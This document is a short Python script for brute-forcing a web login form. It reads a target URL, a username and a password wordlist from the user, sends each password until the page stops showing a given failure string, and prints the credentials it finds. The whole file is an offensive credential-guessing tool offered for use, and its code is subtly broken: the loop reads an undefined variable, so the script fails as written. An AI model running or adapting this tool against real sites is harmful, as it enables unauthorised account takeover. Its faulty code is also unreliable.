import requests
from termcolor import colored

url = input(' [+] Enter Page URL: ')
username = input(' [+] Enter Username for the account to Bruteforce: ')
password_file = input('[+] Enter Password file to uses: ')
login_failed_string = input('[+] Enter string that occurs when login fails: ')
cookie_value = input('Enter cookie value (Optional): ')

def cracking(username,url):
    for password in passwords:
        password = password.strip()
        print(colored(('Trying: ' + password), 'red'))
        data = {'username':username, 'password':password, 'Login':'submit'}
        # depends on what the html label is named / you may have to change username for your usecase
        if cookie_value !='':
                response = requests.get(url, params={'username':username, 'password':password, 'Login':'Login'}, cookies = {'Cookie': cookie_value})
        else:
            response = requests.post(url, data=data)
                # change on page you are bruteforcing
        if login_failed_string in response.content.decode():
            pass 
        else:
            print(colored(('[+] found username => ' + username), 'green'))
            print(colored(('[+] found password => ' + password), 'green'))
            exit()



with open(password_file, 'r') as password:
    cracking(username, url)

print('[!!] Password not in list')